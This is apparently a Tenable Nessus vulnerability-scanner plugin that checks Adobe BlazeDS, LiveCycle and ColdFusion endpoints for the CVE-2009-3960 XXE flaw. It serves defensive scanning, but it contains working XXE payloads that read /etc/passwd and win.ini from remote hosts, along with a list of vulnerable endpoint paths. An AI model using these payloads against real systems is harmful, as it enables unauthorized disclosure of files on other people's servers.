#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(44937);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2016/09/26 16:33:57 $");

  script_cve_id("CVE-2009-3960");
  script_bugtraq_id(38197);
  script_osvdb_id(62292);
  script_xref(name:"EDB-ID", value:"11529");
  script_xref(name:"Secunia", value:"38543");

  script_name(english:"Multiple Adobe Products XML External Entity (XXE) Injection (APSB10-05)");
  script_summary(english:"Attempts to retrieve a local file");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is susceptible to XML External Entity (XXE)
attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running an Adobe product that is
susceptible to XML External Entity (XXE) attacks.  The installed
version of the product fails to block the use of external XML entities
while using the HTTPChannel to transport data in AMFX format.  A
remote, unauthenticated attacker could exploit this vulnerability to
read arbitrary files from the remote system. 

According to the Adobe advisory, Adobe BlazeDS, LiveCycle, LiveCycle
Data Services, Flex Data Services and ColdFusion are known to be
affected by this issue." );
   # http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6688a1e2" );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2010/Feb/197" );
  script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/bulletins/apsb10-05.html" );
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate vendor-supplied patches." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Adobe XML External Entity File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/02/11");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/02/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/03/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:adobe:lifecycle");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:adobe:lifecycle_data_services");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:adobe:flex_data_services");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:adobe:coldfusion");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:adobe:blazeds");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl","os_fingerprint.nasl");
  script_require_ports("Services/www", 80, 8400, 8500);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

# Make a list of known HTTPChannel endpoints.

# Check for sample apps only if thorough_tests
# are enabled

if(thorough_tests)
{
  if (get_port_transport(port) > ENCAPS_IP)
  {
    urls = make_list(
      "/flex2gateway/http", # ColdFusion 9 (disabled by default)
      "/flex2gateway/httpsecure", # ColdFusion 9 (disabled by default)
      "/messagebroker/http",
      "/messagebroker/httpsecure",
      "/blazeds/messagebroker/http", # Blazeds 3.2
      "/blazeds/messagebroker/httpsecure", #
      "/samples/messagebroker/http", # Blazeds 3.2
      "/samples/messagebroker/httpsecure", # Blazeds 3.2
      "/lcds/messagebroker/http", # LCDS
      "/lcds/messagebroker/httpsecure", # LCDS
      "/lcds-samples/messagebroker/http", # LCDS
      "/lcds-samples/messagebroker/httpsecure"); # LCDS
  }
  else
  {
    urls = make_list(
      "/flex2gateway/http", # ColdFusion 9 (disabled by default)
      "/messagebroker/http",
      "/blazeds/messagebroker/http", # Blazeds 3.2
      "/samples/messagebroker/http", # Blazeds 3.2
      "/lcds/messagebroker/http", # LCDS
      "/lcds-samples/messagebroker/http"); # LCDS
  }
}
else
{
  if (get_port_transport(port) > ENCAPS_IP)
  {
    # nb : Both endpoints (http/httpsecure) are vulnerable on
    #      encrypted ports.

    urls = make_list(
      "/flex2gateway/http", # ColdFusion 9 (disabled by default)
      "/flex2gateway/httpsecure", # ColdFusion 9 (disabled by default)
      "/messagebroker/http",
      "/messagebroker/httpsecure", # Blazeds 3.2
      "/blazeds/messagebroker/http", # Blazeds 3.2
      "/blazeds/messagebroker/httpsecure",
      "/lcds/messagebroker/http", # LCDS
      "/lcds/messagebroker/httpsecure"); # LCDS
  }
  else
  {
    urls = make_list(
      "/flex2gateway/http", # ColdFusion 9 (disabled by default)
      "/messagebroker/http",
      "/blazeds/messagebroker/http", # Blazeds 3.2
      "/lcds/messagebroker/http"); # LCDS
  }
}

os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) injections = make_list(
    '<!DOCTYPE foo [ <!ENTITY nessus SYSTEM "c:\\windows\\win.ini"> ]>',
    '<!DOCTYPE foo [ <!ENTITY nessus SYSTEM "c:\\winnt\\win.ini"> ]>');
  else injections = make_list(
    '<!DOCTYPE foo [ <!ENTITY nessus SYSTEM "/etc/passwd"> ]>');
}
else injections = make_list(
  '<!DOCTYPE foo [ <!ENTITY nessus SYSTEM "c:\\windows\\win.ini"> ]>',
  '<!DOCTYPE foo [ <!ENTITY nessus SYSTEM "c:\\winnt\\win.ini"> ]>',
  '<!DOCTYPE foo [ <!ENTITY nessus SYSTEM "/etc/passwd"> ]>');

injection_pats = make_array();
injection_pats['<!DOCTYPE foo [ <!ENTITY nessus SYSTEM "c:\\windows\\win.ini"> ]>'] = "\[[a-zA-Z\s]+\]|; for 16-bit app support";
injection_pats['<!DOCTYPE foo [ <!ENTITY nessus SYSTEM "c:\\winnt\\win.ini"> ]>'] = "\[[a-zA-Z\s]+\]|; for 16-bit app support";
injection_pats['<!DOCTYPE foo [ <!ENTITY nessus SYSTEM "/etc/passwd"> ]>'] = "root:.*:0:[01]:";

info = NULL;

foreach injection (injections)
{
  foreach url (urls)
  {
    exploit = '<?xml version="1.0" encoding="utf-8"?>' + '\n' +
      injection + '\n' +
      '<amfx ver="3" xmlns="http://www.macromedia.com/2005/amfx">' + '\n' +
      '  <body>' + '\n' +
      '    <object type="flex.messaging.messages.CommandMessage">' + '\n' +
      '      <traits>' + '\n' +
      '        <string>body</string><string>clientId</string><string>correlationId</string>' + '\n' +
      '        <string>destination</string><string>headers</string><string>messageId</string>' + '\n' +
      '        <string>operation</string><string>timestamp</string><string>timeToLive</string>' + '\n' +
      '       </traits><object><traits />' + '\n' +
      '      </object>' + '\n' +
      '      <null /><string /><string />' + '\n' +
      '      <object>' + '\n' +
      '        <traits>' + '\n' +
      '          <string>DSId</string><string>DSMessagingVersion</string>' + '\n' +
      '        </traits>' + '\n' +
      '        <string>nil</string><int>1</int>' + '\n' +
      '      </object>' + '\n' +
      '      <string>&nessus;</string>' + '\n' +
      '<int>5</int><int>0</int><int>0</int>' + '\n' +
      '    </object>' + '\n' +
      '  </body>' + '\n' +
      '</amfx>';

     res = http_send_recv3(
       method:"POST",
       item:url,
       port:port,
       add_headers: make_array("Content-Type", "application/x-amf"),
       data:exploit,
       exit_on_fail:TRUE);

     match = egrep(pattern:injection_pats[injection], string:res[2]);

     if (
       res[2] &&
       "<amfx" >< res[2] &&
       (!empty_or_null(match))
     )
     {
       req = http_last_sent_request();
       output = NULL;

       if ("win.ini" >< injection)
       {
         file = "win.ini";
       }
       else file = "/etc/passwd";

       # Format output
       pos = stridx(match, "null/><string>");
       if (pos > 0 && !empty_or_null(pos))
       {
         output = substr(match, pos);
         output = output - "null/><string>";
       }
       # Should never reach this, but just in case
       if (empty_or_null(output))
         output = extract_pattern_from_resp(string:res[2], pattern:'RE:'+injection_pats[injection]);

        info += '\n' + 'HTTPChannel Endpoint : ' + url + '\n';
        snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
        info += '\n' +
          'Nessus was able to exploit the issue to retrieve the contents of ' +
          '\n' + "'" + file + "'" + ' using the following request :' +
          '\n\n' +req +'\n\n' +
          'This produced the following truncated output (limited to 10 lines) :' +
          '\n' + snip +
          '\n' + beginning_of_response2(resp:output, max_lines:10) +
          '\n' + snip +
          '\n';
     }
     if (!isnull(info)) break;
  }
  if (!isnull(info)) break;
}

if (!isnull(info))
{
  if (report_verbosity > 0)
  {
   report = '\n' +
      "Nessus found following vulnerable HTTPChannel endpoint : " + '\n' +
        info + '\n';
     security_warning(port:port, extra:report);
  }
  else
     security_warning(port);
}
else exit(0, 'Nessus did not identify any affected endpoints on the webserver listening on port '+ port);
